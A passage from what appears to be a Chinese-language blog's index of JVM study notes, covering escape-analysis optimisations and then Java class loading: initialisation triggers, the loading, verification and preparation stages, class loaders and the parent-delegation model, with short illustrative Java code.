x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> <span class="variable">XX</span> <span class="operator">=</span> x+<span class="number">2</span>;</span><br><span class="line">  <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> point_memory_alloc();  <span class="comment">//堆中分配P对象</span></span><br><span class="line">  p.x==XX;<span class="comment">//Person构造函数内联后</span></span><br><span class="line">  p.y==<span class="number">42</span>;</span><br><span class="line">  <span class="keyword">return</span> p.x;<span class="comment">//Person::getX()被内联后</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二步：进行标量替换优化</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getValue</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> <span class="variable">XX</span> <span class="operator">=</span> x+<span class="number">2</span>;</span><br><span class="line"><span class="comment">//相当于我不创建一个完整对象了，我只创建几个标量来代替使用</span></span><br><span class="line">  <span class="type">int</span> <span class="variable">pX</span> <span class="operator">=</span> XX;</span><br><span class="line">  <span class="type">int</span> <span class="variable">py</span> <span class="operator">=</span> <span class="number">42</span>;</span><br><span class="line">  <span class="keyword">return</span> pX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第三步：作无效代码消除后</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getValue</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> x+<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        标量替换会更加严格一些：不允许方法逃狱。</p><h4 id="同步消除"><a href="#同步消除" class="headerlink" title="同步消除"></a>同步消除</h4><blockquote><p>同步消除是指Java中的锁的优化，也就是当我们分析出一个同步的方法，实际中不会被其他线程所争抢，那么久没有必要上锁了，相当于你去公共厕所，怕别人进来，你上把锁。走了再开锁，那如果是在你家，只有你一个人时，就没必要再加个锁吧，再懒点儿你门都可以不要了。</p></blockquote><p>​        当经过逃逸分析后，我们发现方法不会被其他线程访问使用，也就是线程逃逸，我们就可以不对线程进行同步操作。</p><h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><p>​        从测试中我们发现效果不错，但实际中可能分析后消耗了性能还发现能被优化的很少。所以在<code>JDK 6 Update 23</code>之前是禁止该优化的，之后才开始默认开启逃逸分析。</p><ol><li><code>-XX:+DoEscapeAnalysis</code>手动开启逃逸分析</li><li><code>-XX:+PrintEscapeAnalysis</code>来查看开启后的分析结果</li><li><code>-XX:+EliminateAllocations</code>开启标量替换</li><li><code>-XX:+PrintEliminateAllocations</code>查看标量替换结果</li><li><code>-XX:+EliminateLocks</code>开启同步消除</li></ol>]]></content>
      
      
      <categories>
          
          <category> JVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逃逸分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类加载机制</title>
      <link href="/2022/11/25/JVM/7_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
      <url>/2022/11/25/JVM/7_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote><p>虚拟机是如何加载Class文件的？</p><p>Class文件进入虚拟机后会有什么变化？</p></blockquote><p>​        在Java中我们知道有编译期和运行期，其中编译期为我们写的java代码通过javac编译成一个一个的class文件，而运行期则为将class文件通过jvm加载到内存中，通过一些列操作变成可以jvm直接使用的Java类型。这为Java带来了极高的扩展性和灵活性，例如动态链接和到动态加载，具体下来可用面向接口编程和一系列设计模式进行举例。</p><h2 id="类的加载时机"><a href="#类的加载时机" class="headerlink" title="类的加载时机"></a>类的加载时机</h2><p>​        一个类型从加载到jvm内存中开始，到卸载出内存为止，整个生命周期经历了：</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heg77pblj30vo0fydhc.jpg" alt="image-20220611192459719"></p><p>​        其中加载，验证，准备，初始化是按部就班的开始的，解析则不一定，一些情况中解析是在初始化后的，而这也是为了支持java的运行时绑定特性。</p><p>​        一般类的加载在《java虚拟机规范》中并没有强制要求，根据具体的虚拟机实现完成，而类的初始化则严格按照规定，有且只有六中情况，必须对类进行初始化，而前面的步骤自然也要提前完成。</p><ol><li>遇到new,getstatic,putstatic,invokestatic 这四条字节码指令时，如果当前系统中还没加载这个类，则必须对其进行初始化。其中具体场景有：<ol><li>通过new关键字创建实例时，对类进行初始化。</li><li>读取或设置一个类型的静态字段（static final 不算，因为在编译期间就把结果放在了常量池中，读取数据时，不需要初始化该类）</li><li>调用一个类的静态方法。</li></ol></li><li>使用reflect包进行反射时，对类进行初始化</li><li>在该类初始化时发现其父类还没有初始化，则先将其父类进行初始化，再初始化当前类</li><li>当虚拟机启动时，用户需要执行一个主类（执行main()方法的类），虚拟机会先初始化这个类</li><li>jdk7新加入的动态语言支持时，如果有一个java.long.invoke.MethodHandle实例最后解析为REF_getStatus,REF_putStatus,REF_invokeStatic,REF_newInvokeSpecial四种类型的方法句柄，当这个方法句柄的类没有初始化时，则需要先初始化。</li><li>当一个接口中定义了JDK8新加入的默认方法，(被default关键字修饰的接口方法)时，该类的实现类发生初始化时，需要先对其接口初始化</li></ol><p>​        这6中方法时有且仅有的使触发类型进行初始化的场景，也被称为主动引用，其他引用方式的类型都不会触发初始化了，也被称为被动引用。下面举几个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SuperClass</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is SuperClass&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubClass</span> <span class="keyword">extends</span> <span class="title class_">SuperClass</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is SubClass&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NotInitialization</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        通过-XX:+TraceClassLoading可以查看类的加载情况</span></span><br><span class="line"><span class="comment">        可以发现三个类的被加载了，但是SubClass类并没有初始化，也就是其中的static静态代码块并没执行</span></span><br><span class="line"><span class="comment">        而这里我们通过子类去调用父类的静态变量，则只是初始化父类信息</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">        运行结果：</span></span><br><span class="line"><span class="comment">        this is SuperClass</span></span><br><span class="line"><span class="comment">        10</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(SubClass.i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NotInitialization</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//这里我们可以发现，在创建类型数组时，也只是对该类型进行加载，而没有初始化</span></span><br><span class="line">        SuperClass[] list = <span class="keyword">new</span> <span class="title class_">SuperClass</span>[<span class="number">10</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NotInitialization</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 我们可发现这里也没有打印静态代码块内容i，连ConstClass类都没有加载</span></span><br><span class="line"><span class="comment">         * 这是因为ConstClass.i 在编译期间通过常量的传播优化，已经将该值传入到</span></span><br><span class="line"><span class="comment">         * NotInitialization类的常量池中，这时候对ConstClass.i的引用就变成了对自身常量池的引用</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(ConstClass.i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConstClass</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is ConstClass&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span>  <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        而接口的加载与类的加载有一些不同，接口也有初始化的过程，与类一致，但是没有static静态代码块，编译器仍会为接口生成“<clinit>”类构造器，用来初始化接口中定义的成员变量，而接口与类的真正区别在于，类的初始化之前会将父类都进行初始化，而接口在初始化时，并不要求父接口都完成初始化，只有在真正使用父接口时（如引用接口中的常量）才会初始化。</p><h2 id="类加载的过程"><a href="#类加载的过程" class="headerlink" title="类加载的过程"></a>类加载的过程</h2><h3 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h3><p>​        在加载阶段，java虚拟机需要完成以下三件事</p><ol><li>通过一个类的全限定名来获取定义此类的二进制字节流</li><li>将这个字节流代表的静态存储结构转化为方法区的运行时数据结构</li><li>在内存中生成一个代表这个类的java.long.Class对象，作为方法区这个类的各种数据的访问入口</li></ol><blockquote><p>《java虚拟机规范》对这三点要求并不是很具体，供开发人员操作的空间很大</p></blockquote><blockquote><p>就比如说获取二进制字节流的方式就有很多</p><ol><li>从ZIP压缩包获取，常见的JAR包，WAR包</li><li>从网络中获取，常见的有Web Applet</li><li>运行时计算生成，动态代理技术</li><li>从其他文件生成，JSP文件生成对应的Class文件</li><li>。。。</li></ol></blockquote><p>​        相对于类加载过程的其他阶段，非数组类型的加载阶段（准确来说是加载阶段中获取类的二进制字节流的动作）是开发者可控性最高的阶段，加载阶段既可以使用java虚拟机内置的启动类加载器来完成。也可以由用户定义的类加载器完成。</p><p>​        对于数组类而言，情况也有所不同，数组类本身不通过类加载器创建，是由Java虚拟机在内存中动态构造出来的，但数组类与类加载仍有很大关系，因为里面的元素还是要靠类加载器完成加载。一个数组类在创建中遵守以下几个规则。</p><ol><li>如果数组类的元素为引用型数据，就递归采用原先定义好的类加载过程去加载组件，数组类将被标记在加载该组件类型的类加载器的类名称空间上。（！！！一个类型必须与类加载器一起确定唯一性）</li><li>如果数组类元素不是引用型（列入int[]）Java虚拟机将会把数组类标记为与启动类加载器关联。</li><li>数组类的可访问性与他的组件类型的可访问性一致，如果组件类型不是引用类型，他的数组类的可访问性将默认为public，可被所有的类和接口访问到。</li></ol><p>​        加载阶段结束后，Java虚拟机外部的二进字节流就按照虚拟机所设定的格式存储在<code>方法区</code>之中，类型数据妥善安置在方法区之后，会在Java<code>堆内存</code>中实例化一个<code>java.lang.Class</code>类的对象，这个对象将作为程序访问方法区中类型数据的<code>外部接口</code></p><p>​        加载阶段与连接阶段的部分动作是交叉进行的，加载阶段尚未完成，连接阶段可能就已经开始。</p><h4 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h4><p>​        对于任何一个类，<strong>都需要它的类加载器与类本身共同确定在虚拟机中的唯一性</strong>，每个类加载器都有自己的名称空间，通俗来说判断两个类是否相等，前提条件就是是否是同一个类加载器加载的，换句话说：即使是同一个Class文件源，通过不同的类加载器，两个类也就势必不同。</p><blockquote><p>代码测试</p><p>这个案例中我们可以看到我们自己定义了一个类记载器，然后来加载当前这个类，并输出实例对象，都没有问题，但最后使用instance时做类型判定时发现输出为false。</p><p>这是因为我们在类的初始化中所述，当java含有main方法的启动类执行时，会默认进行类的初始化，这个时候它是由系统默认的类加载器，而当我们在main方法中创建了一个类加载器时并加载该类，在虚拟机中创建的完全就是不同的类了。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.fenixsoft.classloading;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//org.fenixsoft.classloading.ClassLoaderTest@47089e5f</span></span><br><span class="line">    <span class="comment">//false</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">myloader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> name.substring(name.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> getClass().getResourceAsStream(fileName);</span><br><span class="line">                    <span class="keyword">if</span> (inputStream == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[inputStream.available()];</span><br><span class="line">                    inputStream.read(b);</span><br><span class="line">                    <span class="keyword">return</span> defineClass(name, b, <span class="number">0</span>, b.length);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> myloader.loadClass(<span class="string">&quot;org.fenixsoft.classloading.ClassLoaderTest&quot;</span>).newInstance();</span><br><span class="line">        System.out.println(instance);</span><br><span class="line">        System.out.println(instance <span class="keyword">instanceof</span> org.fenixsoft.classloading.ClassLoaderTest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h5><p>​        从java虚拟机的角度来看，只存在两种不同的类加载器：一种是启动类加载器（Bootstrap ClassLoader），该加载器是用C++实现的(这里仅限HotSpot)，是虚拟机的一部分，另外一种是其他所有的类加载器，又java实现，独立于虚拟机外部，并全部继承抽象类<code>java.lang.ClassLoader</code></p><p>​        从JDK1.2以来，Java一直保持着三层类加载器，双亲委派的类加载架构，尽管该架构，在java模块化系统出现了一些调整，但未改变主体架构。</p><blockquote><p> 下面我们来介绍什么是三层类加载器，什么是双亲委派。</p></blockquote><ol><li>启动类加载器（BootStrap Class Loader）<ol><li>只加载<code>&lt;JAVA_HOME&gt;/bin</code>目录下的文件</li><li>被-Xbootclasspath参数指定的路径下文件</li><li>按照文件名（rt.jar,tools.jar）可被识别的类库</li><li>启动类加载器无法被java程序直接调用，当自定义类加载器时，需要交给启动类加载器，使用null代替即可。</li></ol></li></ol><blockquote><p>通过<code>java.lang.Class.getClassLoader()方法作为示例</code></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Returns the class loader for the class.  Some implementations may use</span></span><br><span class="line"><span class="comment">    * null to represent the bootstrap class loader. This method will return</span></span><br><span class="line"><span class="comment">    * null in such implementations if this class was loaded by the bootstrap</span></span><br><span class="line"><span class="comment">    * class loader.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * &lt;p&gt; If a security manager is present, and the caller&#x27;s class loader is</span></span><br><span class="line"><span class="comment">    * not null and the caller&#x27;s class loader is not the same as or an ancestor of</span></span><br><span class="line"><span class="comment">    * the class loader for the class whose class loader is requested, then</span></span><br><span class="line"><span class="comment">    * this method calls the security manager&#x27;s &#123;<span class="doctag">@code</span> checkPermission&#125;</span></span><br><span class="line"><span class="comment">    * method with a &#123;<span class="doctag">@code</span> RuntimePermission(&quot;getClassLoader&quot;)&#125;</span></span><br><span class="line"><span class="comment">    * permission to ensure it&#x27;s ok to access the class loader for the class.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;If this object</span></span><br><span class="line"><span class="comment">    * represents a primitive type or void, null is returned.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>  the class loader that loaded the class or interface</span></span><br><span class="line"><span class="comment">    *          represented by this object.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> SecurityException</span></span><br><span class="line"><span class="comment">    *    if a security manager exists and its</span></span><br><span class="line"><span class="comment">    *    &#123;<span class="doctag">@code</span> checkPermission&#125; method denies</span></span><br><span class="line"><span class="comment">    *    access to the class loader for the class.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@see</span> java.lang.ClassLoader</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@see</span> SecurityManager#checkPermission</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@see</span> java.lang.RuntimePermission</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@CallerSensitive</span></span><br><span class="line">   <span class="keyword">public</span> ClassLoader <span class="title function_">getClassLoader</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> getClassLoader0();</span><br><span class="line">       <span class="keyword">if</span> (cl == <span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">       <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">           ClassLoader.checkClassLoaderPermission(cl, Reflection.getCallerClass());</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> cl;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>扩展类加载器（Extension Class Loader）:</p><ol><li><p>这个类加载器是在类<code>sun.misc.Launcher&amp;ExtClassLoader</code>中以Java代码形式实现的</p></li><li><p>主要负责加载<code>&lt;JAVA_HOME&gt;/lib/ext</code>目录中</p></li><li><p>或者被<code>java.ext.dirs</code>系统变量所指定的路径中所有的类库</p></li><li><p>这是Java系统类库的扩展机制，也就是可以将具有通用性的类库放置在ext目录里扩展Java SE的功能</p><blockquote><p>不过在JDK9之后被模块化带来的天然扩展能力替代</p></blockquote></li><li><p>由于是Java编写的，开发者可直接调用</p></li></ol></li><li><p>应用程序类加载器（Application Class Loader）：</p><ol><li>在<code>sun.misc.Launcher$AppClassLoader</code>来实现的。</li><li>是ClassLoader.getSystemClassLoader()方法的返回值</li><li>负责加载用户路径（ClassPath）上所有的类库</li><li>可被直接调用，如果没有自己定义，它就是系统默认的类加载器</li></ol></li></ol><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heg7kduuj30hy0g2gmo.jpg" alt="image-20220618151703298"></p><p>​        双亲委派模型要求：除了顶部的启动类加载器，剩下的类加载器都应有自己的父类加载器，这里的父类不是指继承，<code>通常</code>指的是组合，也就是复用父类加载器的代码。</p><blockquote><p>这里的通常是指:双亲委派模型并不是强制性约束，而是推荐的一种类加载器实现的最佳实现</p></blockquote><blockquote><p>双亲委派模型的工作流程：</p></blockquote><p>​        当类加载器受到类加载请求时，并不会自己直接尝试加载，而是交给父类加载器，所有的请求最终都应该到启动类加载器，如果父类反馈无法加载（搜索范围找不到所需的类），子类再自己去尝试加载。</p><blockquote><p>双亲委派的好处？</p></blockquote><p>​        一个好处就是可以让类也保持一种层级关系，比如<code>java.lang.Object</code>,每个类的超类，存放在<code>rt.jar</code>下，无论哪个类加载器加载，都会发送到启动类加载器加载，因此Object类在各种类加载器环境下都能保证是同一个类。</p><p>​        这里如果不使用双亲委派模型，就会导致类关系混乱。比如用各自不同的类加载器加载Object，系统中就会有不同的Object类。比如我们自己写一个Object类,或者一个String类，编译可以通过，但是无法运行，这也是一种强有力的保护措施。</p><blockquote><p>双亲委派的代码：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">  <span class="comment">// 只能有一个线程来加载</span></span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                      <span class="comment">// 如果有父类加载器，用父类的</span></span><br><span class="line">                        c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 用Bootstrap</span></span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="破坏双亲委派模型"><a href="#破坏双亲委派模型" class="headerlink" title="破坏双亲委派模型"></a>破坏双亲委派模型</h5><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>​        确保class文件的二进制流数据符合java虚拟机规范，不会损害虚拟机。我们可以知道java编译器会先对代买进行格式检查，如果正确才编译成class文件，但是class文件并不一定是编译后的，也可以通过0,1直接在二进制编辑器中生成的，所以虚拟机需要再对该数据进行校验。</p><p>​        验证阶段一般分为：文件格式校验，元数据校验，字节码校验，符号引用校验。</p><ol><li><p>文件格式校验：</p><ol><li>该阶段只要检查文件版本，魔数，索引等一些规范数据是否正常</li><li>如果没有问题，字节流才被允许进入java虚拟机内存的方法区进行存储，也就是后面的阶段都是针对方法区的存储结构进行的，不会直接读取，操作字节流了。</li></ol></li><li><p>元数据校验：</p><ol><li>针对类的信息进行检查，比如父类信息，子类是否实现父类所有要求实现的方法。</li><li>保证符合《Java语义规范》</li></ol></li><li><p>字节码校验：</p><ol><li>这一部分是整个校验部分最复杂的，负责检查语义是否合法，比如类中的方法体，进行校验分析，保证不会损害虚拟机。</li><li>需要注意如果一个类型的方法体的字节码没有通过字节码验证，说明一定有问题，但如果验证通过了，也无法保证其一定安全。</li></ol><blockquote><p>这里引申一个概念：“停机问题”</p><blockquote><p>通俗的讲：通过程序去判断一个程序是否有问题是无法保证准确的。</p></blockquote></blockquote><ol start="3"><li>后面因为设计团队不想在这个阶段花费太多的时间，JDK6之后javac编译器和虚拟机进行一项联合优化，把尽可能多的校验放在javac中，具体做法是在方法体Code属性的属性表新添加一个“StackMapTable”属性。以后虚拟机只检查它就好了，不过也有一定被篡改欺骗的风险。</li></ol></li><li><p>符合引用校验：        </p><ol><li>发生在虚拟机将符号引用变为直接引用的时候。</li><li>判断该类是否缺少或者被禁止访问它所需要的外部资源，例如外部类，方法，字段。</li><li>这里可以做一个优化，当一个程序运行的全部代码已经被反复的使用和验证后，则可以在生产环境使用<code>-Xverify:none</code>参数来关闭大部分的类校验措施，缩短虚拟机加载的时间。</li></ol></li></ol><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>​        这一阶段是正式为类中定义的静态变量（static修饰的）进行初始化零值，也就是类型的默认值。这一部分数据在JDK7之前是放在方法区的，后面类变量则会随着Class对象存放在堆中。</p><h3 id="解析"><a 